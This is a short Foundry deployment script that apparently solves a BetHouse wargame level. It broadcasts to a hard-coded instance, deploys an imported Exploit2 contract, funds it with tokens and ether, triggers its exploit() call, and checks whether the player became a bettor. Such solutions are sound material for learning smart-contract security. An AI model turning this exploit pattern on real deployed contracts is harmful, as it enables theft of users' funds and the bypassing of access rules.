// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {BetHouse, Pool, PoolToken, Exploit2} from "src/34.BetHouse.sol";

contract BetHouse2Script is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        address instanceAddr = 0xc8DcdaE30Def764e5eC9E3d86E2258aba4941B93;
        address playerAddr = msg.sender;

        BetHouse betHouse = BetHouse(instanceAddr);

        PoolToken depositToken = PoolToken(Pool(betHouse.pool()).depositToken());

        Exploit2 exploit2 = new Exploit2(instanceAddr, playerAddr);

        depositToken.transfer(address(exploit2), 5);

        exploit2.exploit{value: 0.001 ether}();

        bool isBettor = betHouse.isBettor(playerAddr);
        console.log("Is Bettor:", isBettor);

        vm.stopBroadcast();
    }
}
